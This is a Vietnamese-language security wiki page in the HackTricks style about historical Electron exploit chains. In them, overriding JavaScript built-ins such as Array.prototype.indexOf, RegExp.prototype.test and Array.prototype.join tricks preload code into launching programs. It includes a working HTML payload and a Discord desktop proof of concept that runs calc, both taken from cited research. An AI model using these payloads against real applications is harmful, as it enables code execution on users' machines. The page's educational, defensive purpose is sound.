# Electron contextIsolation RCE via preload code

{{#include ../../banners/hacktricks-training.md}}

Đây là các **chuỗi khai thác lịch sử**, trong đó mã preload chia sẻ các JavaScript intrinsic hoặc API có quyền cao với nội dung renderer do kẻ tấn công kiểm soát. Khi bật context isolation, preload và trang thường có các JavaScript realm riêng biệt, vì vậy việc ghi đè prototype trong trang không tự động ảnh hưởng đến các đối tượng của preload. Hãy xác minh chuỗi khai thác theo đúng phiên bản Electron/ứng dụng và cách triển khai bridge.<sup>[[3]](#references)</sup>

## Example 1

Ví dụ từ [https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=30](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=30)<sup>[[1]](#references)</sup>

Đoạn mã này mở các liên kết http(s) bằng trình duyệt mặc định:

![Electron contextIsolation RCE via preload code - Example 1: Đoạn mã này mở các liên kết http(s) bằng trình duyệt mặc định](<../../images/image (768).png>)

Trong ứng dụng lịch sử bị ảnh hưởng, một thao tác điều hướng đến tệp cục bộ như `file:///C:/Windows/System32/calc.exe` có thể đi đến một đường dẫn khởi chạy của hệ điều hành; `SAFE_PROTOCOLS.indexOf` được dùng để ngăn chặn điều này.

Do đó, kẻ tấn công có thể inject mã JS này thông qua XSS hoặc điều hướng trang tùy ý:

```html
<script>
  Array.prototype.indexOf = function () {
    return 1337
  }
</script>
```

Vì lời gọi `SAFE_PROTOCOLS.indexOf` luôn trả về 1337, kẻ tấn công có thể bypass cơ chế bảo vệ và thực thi calc. Exploit cuối cùng:

```html
<script>
  Array.prototype.indexOf = function () {
    return 1337
  }
</script>
<a href="file:///C:/Windows/systemd32/calc.exe">CLICK</a>
```

Kiểm tra các slide gốc để tìm những cách khác nhằm thực thi chương trình mà không xuất hiện lời nhắc xin quyền.<sup>[[1]](#references)</sup>

Chuỗi khai thác Discord trước đây cũng xem xét việc tải `file://127.0.0.1/electron/rce.jar` theo kiểu UNC như một đường thực thi tiềm năng khác; hãy xác minh khả năng truy cập trên đúng phiên bản Windows/Electron.<sup>[[2]](#references)</sup>

## Ví dụ 2: Discord App RCE

Ví dụ từ [https://mksben.l0.cm/2020/10/discord-desktop-rce.html?m=1](https://mksben.l0.cm/2020/10/discord-desktop-rce.html?m=1)<sup>[[2]](#references)</sup>

Khi kiểm tra các preload script, tôi phát hiện Discord đưa hàm này vào trang web, cho phép gọi một số module được cho phép thông qua `DiscordNative.nativeModules.requireModule('MODULE-NAME')`.\
Tại đây, tôi không thể dùng các module có thể trực tiếp thực hiện RCE, chẳng hạn như module _child_process_, nhưng tôi **phát hiện một đoạn code có thể đạt được RCE bằng cách ghi đè các phương thức dựng sẵn của JavaScript** và can thiệp vào quá trình thực thi module được expose.

Sau đây là PoC. Tôi xác nhận được rằng ứng dụng **calc** được **bật lên** khi tôi **gọi hàm `getGPUDriverVersions`** được định nghĩa trong module có tên "_discord_utils_" từ devTools, đồng thời **ghi đè `RegExp.prototype.test` và `Array.prototype.join`**.

```javascript
RegExp.prototype.test = function () {
  return false
}
Array.prototype.join = function () {
  return "calc"
}
DiscordNative.nativeModules
  .requireModule("discord_utils")
  .getGPUDriverVersions()
```

Hàm `getGPUDriverVersions` cố gắng thực thi chương trình bằng cách sử dụng thư viện "_execa_", như sau:

```javascript
module.exports.getGPUDriverVersions = async () => {
  if (process.platform !== "win32") {
    return {}
  }

  const result = {}
  const nvidiaSmiPath = `${process.env["ProgramW6432"]}/NVIDIA Corporation/NVSMI/nvidia-smi.exe`

  try {
    result.nvidia = parseNvidiaSmiOutput(await execa(nvidiaSmiPath, []))
  } catch (e) {
    result.nvidia = { error: e.toString() }
  }

  return result
}
```

Thông thường, _execa_ cố gắng thực thi "_nvidia-smi.exe_", được chỉ định trong biến `nvidiaSmiPath`, tuy nhiên, do `RegExp.prototype.test` và `Array.prototype.join` bị ghi đè, **đối số được thay thế thành "**_**calc**_**" trong quá trình xử lý nội bộ của _execa**_**.

Cụ thể, đối số bị thay thế bằng cách tác động đến các đường xử lý phân giải lệnh và xử lý đối số trong parser `cross-spawn` phiên bản cũ.<sup>[[4]](#references)</sup>

## References

- [1] [Electron: Lạm dụng việc thiếu context isolation - CureCon (en)](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=30)
- [2] [RCE trong ứng dụng Discord Desktop](https://mksben.l0.cm/2020/10/discord-desktop-rce.html?m=1)
- [3] [Electron — Context isolation](https://www.electronjs.org/docs/latest/tutorial/context-isolation)
- [4] [Bản sửa đổi parser `node-cross-spawn` và các đường dẫn chính xác được sử dụng trong chuỗi khai thác (dòng 36–55)](https://github.com/moxystudio/node-cross-spawn/blob/16feb534e818668594fd530b113a028c0c06bddc/lib/parse.js#L36-L55)
{{#include ../../banners/hacktricks-training.md}}
